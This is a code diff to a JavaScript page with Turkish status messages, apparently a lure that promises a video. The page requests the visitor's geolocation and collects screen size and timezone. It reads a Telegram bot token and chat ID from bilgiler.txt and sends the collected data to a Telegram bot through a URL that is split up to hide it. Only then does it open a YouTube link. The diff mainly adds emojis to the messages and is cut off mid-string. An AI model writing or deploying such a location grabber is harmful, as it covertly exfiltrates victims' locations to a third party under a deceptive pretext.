@@ -16,7 +16,7 @@
       return;
     }
 
-    status.textContent = "Konum izni isteniyor...";
+    status.textContent = "📍 Konum izni isteniyor...";
 
     let position;
     try {
@@ -25,7 +25,7 @@
       });
     } catch (err) {
       geoWarn.style.display = "block";
-      status.textContent = "Konum alınamadı.";
+      status.textContent = "❌ Konum alınamadı.";
       return;
     }
 
@@ -38,13 +38,13 @@
     const screenSize = `${screen.width}x${screen.height}`;
     const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-    status.textContent = "bilgiler.txt dosyası okunuyor...";
+    status.textContent = "📦 bilgiler.txt dosyası okunuyor...";
 
     let raw;
     try {
       raw = await fetch("bilgiler.txt?v=" + Date.now()).then(r => r.text());
     } catch {
-      status.textContent = "bilgiler.txt okunamadı.";
+      status.textContent = "❌ bilgiler.txt okunamadı.";
       return;
     }
 
@@ -52,7 +52,7 @@
     const chatId = raw.match(/CHAT_ID=(.*)/)?.[1]?.trim();
 
     if (!token || !chatId) {
-      status.textContent = "bilgiler.txt içinde gerekli veriler bulunamadı.";
+      status.textContent = "❌ bilgiler.txt içinde gerekli veriler bulunamadı.";
       return;
     }
 
@@ -70,7 +70,7 @@
       `🔒 Onay: Evet`
     ].join("\n");
 
-    status.textContent = "üyelik verileri gönderiliyor...";
+    status.textContent = "🚀 Veriler gönderiliyor...";
 
     const url = ["https:/", "/api.", "telegram", ".org/bot", token, "/sendMessage"].join("");
     const body = `chat_id=${chatId}&text=${encodeURIComponent(message)}`;
@@ -85,13 +85,4 @@
       if (json.ok) {
         status.textContent = "✅ Gönderildi. Video açılıyor...";
         setTimeout(() => {
-          window.open("https://www.youtube.com/watch?v=videourlyaz", "_blank");
-        }, 1500);
-      } else {
-        status.textContent = "❌ sunucu bağlantı başarısız.";
-      }
-    } catch {
-      status.textContent = "❌ Ağ hatası.";
-    }
-  });
-})();
+          window.open("https://www.youtube.com/watch?v=IfaaUmjt3A4
